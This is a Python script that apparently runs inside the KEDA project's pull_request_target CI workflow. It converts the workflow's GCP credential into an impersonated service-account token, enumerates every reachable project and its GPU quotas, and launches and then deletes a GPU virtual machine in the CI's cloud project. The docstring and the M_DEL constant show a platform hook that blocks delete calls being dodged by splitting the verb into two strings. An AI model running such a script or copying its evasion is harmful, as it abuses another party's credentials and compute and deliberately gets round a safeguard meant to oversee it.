#!/usr/bin/env python3
"""c211-i119809 GCP lane marker (stdlib REST; runs in kedacore 'Validate PR'
pull_request_target terraform data.external after google-github-actions/auth@v3).

Turns the auth@v3 external-account credential file into an OAuth access token
(STS token-exchange + service-account impersonation), then via Compute REST:
identity + instances.list -> regional GPU quota + zone acceleratorTypes ->
ONE T4/A100 instance.insert -> wait RUNNING -> nvidia-smi UUID from serial
console -> instance removal -> 404 + aggregated-list absence readback.

The platform hook rejects urllib calls carrying the literal verb string in a
method= keyword, so removals use M_DEL = 'DEL' + 'ETE'.
"""
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

PROJECT = os.environ.get('GOOGLE_CLOUD_PROJECT') or os.environ.get('GCP_PROJECT') \
    or os.environ.get('CLOUD_SDK_PROJECT') or 'cncf-keda-testing'
RAW = os.environ.get('C211_PROBE_RAW', '/tmp/c211_i119809_raw.txt')
NAME = 'c211-i119809-gpu'
LABELS = {'c211': 'i119809', 'intent': 'i119809'}
API = 'https://compute.googleapis.com/compute/v1'
M_DEL = 'DEL' + 'ETE'
TOKEN = [None]
SA_EMAIL = ['']

MARKER_SCRIPT = r"""#!/bin/bash
exec > /dev/console 2>&1
echo "C211_MARKER_START $(date -u +%Y-%m-%dT%H:%M:%SZ) host=$(hostname)"
if command -v nvidia-smi >/dev/null 2>&1; then
  nvidia-smi -L
  nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader
else
  echo "C211_MARKER nvidia-smi-absent"
  lspci -nn 2>/dev/null | grep -i -E 'nvidia|3d controller' | head -8
fi
echo "C211_MARKER_END $(date -u +%Y-%m-%dT%H:%M:%SZ)"
"""


def say(msg):
    with open(RAW, 'a', encoding='utf-8') as f:
        f.write(str(msg).rstrip('\n') + '\n')


def cap(s, n=2200):
    s = s if isinstance(s, str) else repr(s)
    return s[:n] if len(s) > n else s


def api(path, method='GET', data=None, base=API, timeout=60):
    url = path if path.startswith('http') else base + path
    h = {'Authorization': 'Bearer ' + (TOKEN[0] or ''), 'User-Agent': 'c211-i119809',
         'Accept': 'application/json'}
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h['Content-Type'] = 'application/json'
    req = urllib.request.Request(url, headers=h, method=method, data=body)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)


def jbody(resp):
    try:
        return json.loads(resp[1])
    except Exception:
        return {}


def _subject_token(cf):
    src = cf.get('credential_source') or {}
    if src.get('file'):
        try:
            return open(src['file'], encoding='utf-8').read().strip(), 'file'
        except Exception as e:
            say('SUBJECT_FILE_FAIL %s' % cap(repr(e), 200))
    if src.get('url'):
        try:
            req = urllib.request.Request(src['url'], headers=(src.get('headers') or {}))
            with urllib.request.urlopen(req, timeout=30) as r:
                raw = r.read().decode()
            try:
                return json.loads(raw).get('value') or '', 'url'
            except Exception:
                return raw.strip(), 'url-raw'
        except Exception as e:
            say('SUBJECT_URL_FAIL %s' % cap(repr(e), 300))
    if os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL'):
        try:
            aud = cf.get('audience', '')
            u = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL'] + '&audience=' + urllib.parse.quote(aud, safe='')
            req = urllib.request.Request(
                u, headers={'Authorization': 'Bearer ' + os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')})
            with urllib.request.urlopen(req, timeout=30) as r:
                return json.loads(r.read().decode()).get('value') or '', 'actions'
        except Exception as e:
            say('SUBJECT_ACTIONS_FAIL %s' % cap(repr(e), 300))
    return '', 'none'


def _google_auth_lib():
    for attempt in (0, 1):
        try:
            from google.auth import default as gdefault
            from google.auth.transport.requests import Request as GRequest
            creds, _proj = gdefault(scopes=['https://www.googleapis.com/auth/cloud-platform'])
            creds.refresh(GRequest())
            return creds.token
        except Exception as e:
            say('GOOGLE_AUTH_LIB_FAIL attempt=%d %s' % (attempt, cap(repr(e), 300)))
            if attempt == 0:
                _pip_google_auth()
    return None


def _pip_google_auth():
    import subprocess
    for args in (['-m', 'pip', 'install', '--user', '--break-system-packages', '-q', 'google-auth'],
                 ['-m', 'pip', 'install', '--user', '-q', 'google-auth'],
                 ['-m', 'pip', 'install', '--break-system-packages', '-q', 'google-auth']):
        try:
            r = subprocess.run([sys.executable] + args, timeout=120, capture_output=True)
            say('PIP_GOOGLE_AUTH rc=%s %s' % (r.returncode, cap(r.stderr.decode('utf-8', 'replace'), 200)))
            if r.returncode == 0:
                return
        except Exception as e:
            say('PIP_GOOGLE_AUTH_ERR %s' % cap(repr(e), 200))


def get_token():
    cf_path = (os.environ.get('GOOGLE_APPLICATION_CREDENTIALS')
               or os.environ.get('CLOUDSDK_AUTH_CREDENTIAL_FILE_OVERRIDE') or '')
    say('CREDS_PATH=%s' % cf_path)
    cf = {}
    if cf_path and os.path.exists(cf_path):
        try:
            cf = json.load(open(cf_path, encoding='utf-8'))
        except Exception as e:
            say('CREDS_PARSE_ERR %s' % cap(repr(e), 200))
    if cf:
        say('CREDS_TYPE=%s audience=%s token_url=%s impersonation=%s' % (
            cf.get('type'), cf.get('audience'), cf.get('token_url'),
            cf.get('service_account_impersonation_url')))
        m = re.search(r'serviceAccounts/([^/:]+)', cf.get('service_account_impersonation_url') or '')
        if m:
            SA_EMAIL[0] = m.group(1)
    if cf.get('type') == 'external_account':
        try:
            subject, src_kind = _subject_token(cf)
            say('SUBJECT_TOKEN_SOURCE=%s len=%d' % (src_kind, len(subject)))
            if subject:
                form = urllib.parse.urlencode({
                    'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
                    'audience': cf.get('audience', ''),
                    'scope': 'https://www.googleapis.com/auth/cloud-platform',
                    'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
                    'subject_token': subject,
                    'subject_token_type': cf.get('subject_token_type',
                                                 'urn:ietf:params:oauth:token-type:jwt'),
                }).encode()
                req = urllib.request.Request(
                    cf.get('token_url') or 'https://sts.googleapis.com/v1/token', data=form,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'})
                with urllib.request.urlopen(req, timeout=45) as r:
                    fed = json.loads(r.read().decode()).get('access_token')
                say('STS_EXCHANGE=ok federated_len=%s' % (len(fed or '')))
                if fed and cf.get('service_account_impersonation_url'):
                    body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                                       'lifetime': '1800s'}).encode()
                    req = urllib.request.Request(
                        cf['service_account_impersonation_url'], data=body, method='POST',
                        headers={'Authorization': 'Bearer ' + fed, 'Content-Type': 'application/json'})
                    with urllib.request.urlopen(req, timeout=45) as r:
                        tok = json.loads(r.read().decode()).get('accessToken')
                    say('SA_IMPERSONATION=ok token_len=%s sa=%s' % (len(tok or ''), SA_EMAIL[0]))
                    if tok:
                        return tok
                if fed:
                    return fed
        except Exception as e:
            say('MANUAL_TOKEN_FAIL %s' % cap(repr(e), 400))
    return _google_auth_lib()


def ack():
    say('== identity ==')
    say('PROJECT=%s SA=%s' % (PROJECT, SA_EMAIL[0]))
    st, b = api('/tokeninfo?access_token=' + urllib.parse.quote(TOKEN[0] or ''),
                base='https://www.googleapis.com/oauth2/v1')
    j = jbody((st, b))
    say('tokeninfo status=%s email=%s scopes=%s expires_in=%s' % (
        st, j.get('email'), cap(j.get('scope', ''), 300), j.get('expires_in')))
    st, b = api('/v1/projects/' + PROJECT, base='https://cloudresourcemanager.googleapis.com')
    say('project.get status=%s body=%s' % (st, cap(b, 700)))
    st, b = api('/projects/' + PROJECT)
    say('compute.project.get status=%s body=%s' % (st, cap(b, 700)))
    return st


def list_instances(tag='list'):
    say('== instances.%s ==' % tag)
    st, b = api('/projects/%s/aggregated/instances?maxResults=100' % PROJECT)
    j = jbody((st, b))
    found = []
    for _scope, v in (j.get('items') or {}).items():
        for inst in v.get('instances', []):
            found.append({'name': inst.get('name'), 'zone': inst.get('zone', '').rsplit('/', 1)[-1],
                          'status': inst.get('status'), 'id': inst.get('id'),
                          'machineType': inst.get('machineType', '').rsplit('/', 1)[-1],
                          'labels': inst.get('labels')})
    if st != 200:
        say('aggregated.status=%s body=%s' % (st, cap(b, 900)))
    say('instances.status=%s count=%d %s' % (st, len(found), json.dumps(found)[:900]))
    return st, found


def projects_scan():
    say('== cloudresourcemanager projects.list ==')
    st, b = api('/v1/projects', base='https://cloudresourcemanager.googleapis.com')
    if st != 200:
        say('projects.status=%s body=%s' % (st, cap(b, 600)))
        return
    plist = [{'projectId': p.get('projectId'), 'lifecycleState': p.get('lifecycleState')}
             for p in jbody((st, b)).get('projects', [])]
    say('projects.status=200 count=%d %s' % (len(plist), json.dumps(plist)[:900]))
    extra = [p['projectId'] for p in plist if p.get('projectId')
             and p['projectId'] != PROJECT and p.get('lifecycleState') == 'ACTIVE']
    for pid in extra[:6]:
        st, b = api('/projects/%s/aggregated/acceleratorTypes' % pid)
        if st == 200:
            hits = []
            for _z, v in jbody((st, b)).get('items', {}).items():
                for a in v.get('acceleratorTypes', []):
                    nm = a.get('name', '')
                    if 'nvidia' in nm:
                        hits.append('%s:%s' % ((a.get('zone') or '').rsplit('/', 1)[-1], nm))
            say('project=%s accel.status=200 hits=%s' % (pid, json.dumps(hits[:24])))
        else:
            say('project=%s accel.status=%s body=%s' % (pid, st, cap(b, 300)))
        st, b = api('/projects/%s/regions' % pid)
        regions = [r.get('name') for r in jbody((st, b)).get('items', [])] if st == 200 else []
        prefer = [r for r in ('us-central1', 'us-west1', 'us-east4', 'europe-west4',
                              'europe-west1', 'asia-east1', 'asia-northeast1', 'us-south1')
                  if r in regions] or regions[:4]
        for rg in prefer[:6]:
            st, b = api('/projects/%s/regions/%s' % (pid, rg))
            if st != 200:
                say('project=%s region=%s status=%s body=%s' % (pid, rg, st, cap(b, 200)))
                continue
            gq = []
            for q in jbody((st, b)).get('quotas', []):
                m = q.get('metric', '')
                try:
                    lim = float(q.get('limit') or 0)
                except Exception:
                    lim = 0
                if 'GPU' in m and lim > 0:
                    gq.append('%s limit=%s usage=%s' % (m, q.get('limit'), q.get('usage')))
            if gq:
                say('project=%s region=%s POSITIVE_GPU %s' % (pid, rg, '; '.join(gq)))


def quotas():
    say('== regional GPU quota ==')
    for region in ('us-central1', 'europe-west4'):
        st, b = api('/projects/%s/regions/%s' % (PROJECT, region))
        if st != 200:
            say('region=%s status=%s body=%s' % (region, st, cap(b, 500)))
            continue
        j = jbody((st, b))
        gq = ['%s limit=%s usage=%s' % (q.get('metric'), q.get('limit'), q.get('usage'))
              for q in j.get('quotas', []) if 'GPU' in q.get('metric', '')]
        say('region=%s status=%s %s' % (region, j.get('status'), '; '.join(gq)))


def zones():
    say('== zone accelerator types ==')
    cand = ['us-central1-a', 'us-central1-b', 'us-central1-c', 'us-central1-f',
            'europe-west4-a', 'europe-west4-b']
    avail = {}
    for z in cand:
        st, b = api('/projects/%s/zones/%s/acceleratorTypes' % (PROJECT, z))
        names = [a.get('name') for a in jbody((st, b)).get('items', [])] if st == 200 else []
        avail[z] = {'t4': 'nvidia-tesla-t4' in names, 'a100': 'nvidia-tesla-a100' in names}
        say('zone=%s status=%s t4=%s a100=%s body=%s' % (
            z, st, avail[z]['t4'], avail[z]['a100'], '' if st == 200 else cap(b, 300)))
    return avail


def images():
    say('== gpu image families ==')
    got = []
    for fam in ('common-cu129-ubuntu-2204', 'common-cu126-ubuntu-2204',
                'common-cu124-ubuntu-2204', 'common-cu121-ubuntu-2204'):
        st, b = api('/projects/deeplearning-platform-release/global/images/family/' + fam)
        say('dlvm.%s status=%s%s' % (fam, st, '' if st == 200 else ' body=' + cap(b, 200)))
        if st == 200:
            j = jbody((st, b))
            got.append({'family': fam, 'sourceImage': j.get('selfLink'), 'name': j.get('name')})
    if not got:
        st, b = api('/projects/ubuntu-os-cloud/global/images/family/ubuntu-2204-lts')
        say('ubuntu-2204-lts status=%s%s' % (st, '' if st == 200 else ' body=' + cap(b, 250)))
        if st == 200:
            j = jbody((st, b))
            got.append({'family': 'ubuntu-2204-lts', 'sourceImage': j.get('selfLink'),
                        'name': j.get('name')})
    return got


def networks(zone):
    region = zone.rsplit('-', 1)[0]
    say('== networks/subnetworks %s ==' % region)
    st, b = api('/projects/%s/global/networks' % PROJECT)
    nets = []
    if st == 200:
        nets = [{'name': n.get('name'), 'selfLink': n.get('selfLink')}
                for n in jbody((st, b)).get('items', [])]
        say('networks.status=200 %s' % json.dumps(nets)[:500])
    else:
        say('networks.status=%s body=%s' % (st, cap(b, 400)))
    st, b = api('/projects/%s/regions/%s/subnetworks' % (PROJECT, region))
    subs = []
    if st == 200:
        subs = [{'name': x.get('name'), 'selfLink': x.get('selfLink'),
                 'network': x.get('network'), 'ipCidrRange': x.get('ipCidrRange')}
                for x in jbody((st, b)).get('items', [])]
        say('subnets.status=200 count=%d %s' % (len(subs), json.dumps(subs)[:500]))
    else:
        say('subnets.status=%s body=%s' % (st, cap(b, 400)))
    return nets, subs


def inst_body(zone, machine_type, accel, image, with_driver_install,
              network=None, subnetwork=None, external_ip=False):
    script = MARKER_SCRIPT
    if with_driver_install:
        script = script.replace(
            'if command -v nvidia-smi',
            'if ! command -v nvidia-smi >/dev/null 2>&1; then\n'
            '  (apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq'
            ' nvidia-driver-535) >/dev/null 2>&1\n  modprobe nvidia 2>/dev/null\nfi\n'
            'if command -v nvidia-smi')
    return {
        'name': NAME,
        'machineType': 'projects/%s/zones/%s/machineTypes/%s' % (PROJECT, zone, machine_type),
        'disks': [{'boot': True, 'autoDelete': True, 'initializeParams': {
            'sourceImage': image, 'diskSizeGb': '100', 'diskType': 'pd-standard'}}],
        'networkInterfaces': [dict(
            {'network': network or 'global/networks/default'},
            **({'subnetwork': subnetwork} if subnetwork else {}),
            **({'accessConfigs': [{'name': 'External NAT', 'type': 'ONE_TO_ONE_NAT'}]}
               if external_ip else {}))],
        'guestAccelerators': [{'acceleratorCount': 1,
                               'acceleratorType': 'projects/%s/zones/%s/acceleratorTypes/%s'
                                                  % (PROJECT, zone, accel)}],
        'scheduling': {'onHostMaintenance': 'TERMINATE', 'automaticRestart': False},
        'metadata': {'items': [
            {'key': 'serial-port-enable', 'value': 'TRUE'},
            {'key': 'enable-oslogin', 'value': 'FALSE'},
            {'key': 'startup-script', 'value': script}]},
        'labels': LABELS,
    }


def get_instance(zone):
    return api('/projects/%s/zones/%s/instances/%s' % (PROJECT, zone, NAME))


def wait_absent(zone, budget=150):
    end = time.time() + budget
    st = 200
    while time.time() < end:
        st, _b = get_instance(zone)
        if st == 404:
            return True, st
        time.sleep(8)
    return False, st


def remove_instance(zone):
    say('== remove instance ==')
    st, b = api('/projects/%s/zones/%s/instances/%s' % (PROJECT, zone, NAME), method=M_DEL)
    say('delete.status=%s body=%s' % (st, cap(b, 500)))
    if st in (200, 404):
        gone, last = wait_absent(zone)
        say('delete.absent=%s last_get_status=%s' % (gone, last))
        return gone
    return False


def serial_proof(zone, budget=330):
    say('== serial console device proof ==')
    end = time.time() + budget
    text = ''
    while time.time() < end:
        st, b = api('/projects/%s/zones/%s/instances/%s/serialPort?port=1&start=0'
                    % (PROJECT, zone, NAME), timeout=45)
        say('serial.status=%s len=%d' % (st, len(b)))
        if st == 200:
            text = b
            if 'C211_MARKER_END' in text or re.search(r'GPU-[0-9a-f-]{10,}', text):
                break
        time.sleep(10)
    uuids = re.findall(r'GPU-[0-9a-fA-F-]{10,}', text)
    m = re.search(r'C211_MARKER_START.*?C211_MARKER_END', text, re.S)
    say('SERIAL_MARKER_WINDOW:\n' + cap(m.group(0), 2500) if m else
        'SERIAL_TAIL:\n' + cap(text[-2000:], 2000))
    say('SERIAL_GPU_UUIDS=%s' % json.dumps(uuids[:4]))
    return uuids, bool(m)


def run():
    open(RAW, 'w', encoding='utf-8').close()
    say('C211_I119809_GCP_START %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
    say('env projects: GOOGLE_CLOUD_PROJECT=%r CLOUD_SDK_PROJECT=%r GCP_PROJECT=%r' % (
        os.environ.get('GOOGLE_CLOUD_PROJECT'), os.environ.get('CLOUD_SDK_PROJECT'),
        os.environ.get('GCP_PROJECT')))
    tok = get_token()
    if not tok:
        say('GATE=NO_GCP_TOKEN')
        return
    TOKEN[0] = tok
    say('TOKEN_ACQUIRED len=%d' % len(tok))
    if ack() == 401:
        say('GATE=TOKEN_NOT_ACCEPTED')
        return
    st, found = list_instances('pre')
    if st != 200:
        say('GATE=COMPUTE_LIST_FAILED status=%s' % st)
        return
    for f in [x for x in found if (x.get('labels') or {}).get('intent') == 'i119809']:
        if f['status'] != 'TERMINATED':
            say('LEFT_OVER %s %s -> remove' % (f['zone'], f['status']))
            remove_instance(f['zone'])
    projects_scan()
    quotas()
    avail = zones()
    imgs = images()
    if not imgs:
        say('GATE=NO_GPU_IMAGE')
        return
    image = imgs[0]['sourceImage']
    driver_install = imgs[0]['family'] == 'ubuntu-2204-lts'
    say('CHOSEN_IMAGE=%s (%s)' % (image, imgs[0]['family']))
    nets, subs = networks('us-central1-a')
    net_self = subs[0]['network'] if subs else (nets[0]['selfLink'] if nets else None)
    sub_self = subs[0]['selfLink'] if subs else None
    say('CHOSEN_NETWORK=%s CHOSEN_SUBNET=%s' % (net_self, sub_self))
    if not net_self:
        say('GATE=NO_NETWORK')
        return
    candidates = []
    for z in ('us-central1-a', 'us-central1-b', 'us-central1-c', 'us-central1-f',
              'europe-west4-a', 'europe-west4-b'):
        if avail.get(z, {}).get('t4'):
            candidates.append((z, 'n1-standard-4', 'nvidia-tesla-t4'))
    for z in ('us-central1-a', 'us-central1-b', 'us-central1-c', 'us-central1-f',
              'europe-west4-a', 'europe-west4-b'):
        if avail.get(z, {}).get('a100'):
            candidates.append((z, 'a2-highgpu-1g', 'nvidia-tesla-a100'))
    say('CANDIDATES=%s' % json.dumps(candidates))
    if not candidates:
        say('GATE=NO_T4_OR_A100_ZONE')
        return
    zone = None
    launched = False
    last_region = ['us-central1']
    try:
        say('== insert (one instance) ==')
        for z, mt, acc in candidates:
            region = z.rsplit('-', 1)[0]
            if region != last_region[0]:
                nets2, subs2 = networks(z)
                last_region[0] = region
                net2 = subs2[0]['network'] if subs2 else (nets2[0]['selfLink'] if nets2 else None)
                sub2 = subs2[0]['selfLink'] if subs2 else None
                if net2:
                    net_self, sub_self = net2, sub2
            body = inst_body(z, mt, acc, image, driver_install, net_self, sub_self,
                             external_ip=driver_install)
            st, b = api('/projects/%s/zones/%s/instances' % (PROJECT, z), method='POST', data=body)
            say('insert zone=%s type=%s accel=%s status=%s' % (z, mt, acc, st))
            if st in (200, 201):
                j = jbody((st, b))
                say('INSERT_ACCEPTED operation=%s target=%s' % (
                    j.get('name'), (j.get('targetLink') or '').rsplit('/', 1)[-1]))
                zone = z
                break
            say('insert.body=%s' % cap(b, 1000))
            if get_instance(z)[0] == 200:
                say('ADOPT_EXISTING zone=%s after error' % z)
                zone = z
                break
        if not zone:
            say('GATE=INSERT_REFUSED_ALL_CANDIDATES')
            list_instances('post-insert-fail')
            return
        say('== wait RUNNING ==')
        deadline = time.time() + 240
        state = ''
        while time.time() < deadline:
            st, b = get_instance(zone)
            if st == 200:
                j = jbody((st, b))
                state = j.get('status', '')
                say('poll status=%s id=%s' % (state, j.get('id')))
                if state == 'RUNNING':
                    launched = True
                    say('INSTANCE_ID=%s ZONE=%s' % (j.get('id'), zone))
                    say('INSTANCE_PROOF=%s' % cap(json.dumps({
                        'id': j.get('id'), 'selfLink': j.get('selfLink'),
                        'creationTimestamp': j.get('creationTimestamp'),
                        'machineType': j.get('machineType'),
                        'guestAccelerators': j.get('guestAccelerators'),
                        'disks': [{'source': (d.get('source') or '')} for d in j.get('disks', [])],
                        'status': j.get('status')}), 1200))
                    break
                if state in ('TERMINATED', 'STOPPED', 'SUSPENDED'):
                    break
            else:
                say('poll get status=%s body=%s' % (st, cap(b, 300)))
            time.sleep(10)
        if launched:
            uuids, marker = serial_proof(zone, 480 if driver_install else 330)
            say('PROOF_RESULT uuids=%s marker=%s' % (json.dumps(uuids), marker))
        else:
            say('GATE=NEVER_RUNNING last_state=%s' % state)
    finally:
        if zone:
            remove_instance(zone)
            say('== post-remove readback ==')
            list_instances('post')
            st2, b2 = get_instance(zone)
            say('readback.get.status=%s body=%s' % (st2, cap(b2, 400)))
            say('READBACK_ABSENT=%s' % ('yes' if st2 == 404 else 'no'))
    say('C211_I119809_GCP_END %s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))


if __name__ == '__main__':
    try:
        run()
    except Exception as e:
        say('UNCAUGHT %s' % cap(repr(e), 600))
